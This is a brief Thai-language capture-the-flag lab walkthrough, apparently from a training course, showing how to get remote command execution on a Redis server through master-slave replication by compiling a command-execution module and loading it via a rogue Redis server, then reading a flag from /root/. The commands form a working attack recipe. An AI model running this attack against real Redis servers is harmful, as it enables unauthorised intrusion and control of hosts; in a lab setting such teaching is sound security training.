# โจมตี Redis ที่ Master-Slave mode

1. Download Redis Rogue Server

```
git clone https://github.com/LoRexxar/redis-rogue-server
```

2. Download attack module and compile

```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand
make
```

![image](https://media.mooc.ncsa.or.th/lab_images/1/lab-1-2020050928Dq3ak57S2yyn.png)

3. Copy module.so จาก [RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) ไปยัง [redis-rogue-server](https://github.com/LoRexxar/redis-rogue-server)

```
cp RedisModules-ExecuteCommand/module.so /opt/redis-rogue-server/exp.so
```

4. โจมตีโดยใช้งาน [redis-rogue-server](https://github.com/LoRexxar/redis-rogue-server)

```
python3 redis-rogue-server.py --rhost --rport --lhost --lport
```

![image](https://media.mooc.ncsa.or.th/lab_images/1/lab-1-202005092867xSqfQmDLul.png)

5. เมื่อโจมตีสำเร็จ เราจะสามารถเข้าไปสั่งเครื่องปลายทางได้ จากนั้นเข้าไปอ่าน flag ภายใต้ /root/ อีกที

![image](https://media.mooc.ncsa.or.th/lab_images/1/lab-1-2020050928ZtIiHEAkrsiw.png)